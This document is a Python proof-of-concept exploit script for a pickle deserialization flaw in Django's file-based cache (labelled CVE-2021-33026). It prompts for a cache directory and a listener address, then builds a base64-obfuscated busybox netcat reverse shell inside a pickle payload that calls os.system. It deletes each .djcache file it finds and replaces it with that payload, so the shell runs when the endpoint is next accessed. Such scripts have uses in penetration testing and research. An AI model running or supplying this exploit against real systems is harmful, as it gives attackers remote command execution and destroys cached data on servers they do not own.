import pickle  
import base64
import os  

"""
CVE-2021-33026 

By default, Django relies on Pickle-based serialization for their cache backends. Since the pickle module executes arbitrary Python instructions when unpickled (during deserialization), this may lead to RCE if untrusted input is written into the cache. 

This PoC requires:
    [ ] Write access over the Django cache directory
    [ ] File-based cache storage
    [ ] Existing .djcache files on disk 

References:
https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/django.html#cache-manipulation-to-rce
https://hackerone.com/reports/1415436
https://nvd.nist.gov/vuln/detail/cve-2021-33026
"""
pepinillo = 0

while True:
    cacheDir = input("Enter Django cache directory path: ")

    if os.path.isdir(cacheDir):
        print(f"Using cache directory: {cacheDir}\n")
        break
    else:
        print(f"[!] {cacheDir} not found. Enter a valid path")

ipAddress = input("Enter host IP address: ")
port = input("Enter listening port: ")

revshell = f"busybox nc {ipAddress} {port} -e /bin/bash"
encoded = base64.b64encode(revshell.encode()).decode()

cmd = f"printf {encoded}|base64 -d|bash"  
 
class RCE:  
    def __reduce__(self):  
        return (os.system, (cmd,),)  
  
payload = pickle.dumps(RCE())

for filename in os.listdir(cacheDir):
    if filename.endswith(".djcache"):
        path = os.path.join(cacheDir, filename)  
        try:  
            os.remove(path)
            with open(path, "wb") as f:
                f.write(payload)

                print(f"Payload written to {filename}.")
                pepinillo += 1
        except Exception as e:
            print(f"[!] Failed to modify {filename}: {e}")

print(f"\nTotal files that may be unpickled: {pepinillo}")

if pepinillo > 0:
    print("Trigger payload by accessing the vulnerable endpoint again.")
else:
    print("[!] No .djcache files were found.")
